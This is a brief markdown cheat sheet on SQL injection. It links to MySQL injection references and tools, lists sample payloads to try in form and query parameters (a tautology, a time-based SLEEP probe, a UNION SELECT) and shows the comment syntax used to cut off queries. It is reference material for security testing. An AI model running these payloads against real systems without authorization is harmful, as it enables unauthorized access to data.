# Security - Injections

### MySql
- https://www.pythian.com/blog/mysql-injection-sleep/
- https://github.com/xmendez/wfuzz/blob/master/wordlist/Injections/SQL.txt
- https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/
- https://www.owasp.org/index.php/Blind_SQL_Injection
- https://nvisium.com/blog/2015/06/17/advanced-sql-injection/
- https://www.slideshare.net/nuno.loureiro/advanced-sql-injection-attacks
- http://seclists.org/bugtraq/2005/Feb/att-288/zk-blind.txt
- http://www.unixwiz.net/techtips/sql-injection.html
- http://www.sqlinjection.net/
- http://sqlmap.org/

#### Inputs
Try out these inputs for form and query parameters

```
' OR 1=1 -- 
') OR '' IN ('
') OR login LIKE 'a%' AND SLEEP('5
') UNION SELECT 'a', ('b
```

#### Comments
You can use comments to terminate the rest of a query for an injection 
```
-- commented
# commented
/* commented */
```